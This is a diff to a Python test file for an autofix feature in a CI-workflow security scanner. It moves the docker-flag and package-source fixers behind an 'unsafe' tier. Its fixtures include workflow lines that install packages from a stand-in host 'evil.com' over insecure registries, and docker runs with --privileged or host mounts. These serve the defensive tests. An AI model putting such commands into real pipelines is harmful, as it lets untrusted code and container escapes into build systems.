@@ -158,27 +158,35 @@ class TestCurlPipeCommentOut:
 
 
 class TestDockerFlagRemoval:
+    # These fixers are registered ``unsafe`` (whole-file flag strip can
+    # touch unrelated commands), so they only run under tier="unsafe".
     def test_strips_privileged(self):
         wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
         assert after is not None
         assert "--privileged" not in after
         assert "docker run" in after
 
+    def test_not_applied_under_safe_tier(self):
+        wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
+        assert autofix.generate_fix(_finding("GHA-017"), wf) is None
+
     def test_strips_host_mount(self):
         wf = "  - run: docker run -v /host:/mnt ubuntu:latest cmd\n"
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
         assert after is not None
         assert "-v /host:/mnt" not in after
 
     def test_idempotent(self):
         wf = "  - run: docker run --privileged ubuntu:latest\n"
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
-        assert autofix.generate_fix(_finding("GHA-017"), after) is None
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
+        assert autofix.generate_fix(
+            _finding("GHA-017"), after, tier="unsafe",
+        ) is None
 
     def test_cross_provider_gl(self):
         gl = "    - docker run --net=host myimage\n"
-        after = autofix.generate_fix(_finding("GL-017"), gl)
+        after = autofix.generate_fix(_finding("GL-017"), gl, tier="unsafe")
         assert after is not None
         assert "--net=host" not in after
 
@@ -187,29 +195,37 @@ class TestDockerFlagRemoval:
 
 
 class TestPkgFlagRemoval:
+    # Registered ``unsafe`` (whole-file strip), so only runs under
+    # tier="unsafe".
     def test_strips_insecure_index_url(self):
         wf = "  - run: pip install --index-url http://evil.com/simple/ requests\n"
-        after = autofix.generate_fix(_finding("GHA-018"), wf)
+        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
         assert after is not None
         assert "--index-url" not in after
         assert "pip install" in after
 
+    def test_not_applied_under_safe_tier(self):
+        wf = "  - run: pip install --trusted-host evil.com pkg\n"
+        assert autofix.generate_fix(_finding("GHA-018"), wf) is None
+
     def test_strips_trusted_host(self):
         wf = "  - run: pip install --trusted-host evil.com pkg\n"
-        after = autofix.generate_fix(_finding("GHA-018"), wf)
+        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
         assert after is not None
         assert "--trusted-host" not in after
 
     def test_strips_npm_insecure_registry(self):
         wf = "  - run: npm install --registry=http://evil.com pkg\n"
-        after = autofix.generate_fix(_finding("BB-014"), wf)
+        after = autofix.generate_fix(_finding("BB-014"), wf, tier="unsafe")
         assert after is not None
         assert "--registry" not in after
 
     def test_idempotent(self):
         wf = "  - run: pip install --trusted-host evil.com pkg\n"
-        after = autofix.generate_fix(_finding("GHA-018"), wf)
-        assert autofix.generate_fix(_finding("GHA-018"), after) is None
+        after = autofix.generate_fix(_finding("GHA-018"), wf, tier="unsafe")
+        assert autofix.generate_fix(
+            _finding("GHA-018"), after, tier="unsafe",
+        ) is None
 
 
 # ── Jenkins Groovy secret redaction ────────────────────────────────────
@@ -1396,7 +1412,7 @@ class TestBuildkiteFixers:
 
     def test_bk005_strips_privileged(self):
         wf = "  - command: docker run --privileged ubuntu:latest cmd\n"
-        after = autofix.generate_fix(_finding("BK-005"), wf)
+        after = autofix.generate_fix(_finding("BK-005"), wf, tier="unsafe")
         assert after is not None
         assert "--privileged" not in after
         assert "docker run" in after
@@ -1681,7 +1697,7 @@ class TestDockerFlagRemovalPreservesIndent:
             "      - name: launch\n"
             "        run: docker run --privileged ubuntu:latest cmd\n"
         )
-        after = autofix.generate_fix(_finding("GHA-017"), wf)
+        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
         assert after is not None, (
             "fixer produced no patch, likely because collapsed indent "
             "tripped the YAML safety net"
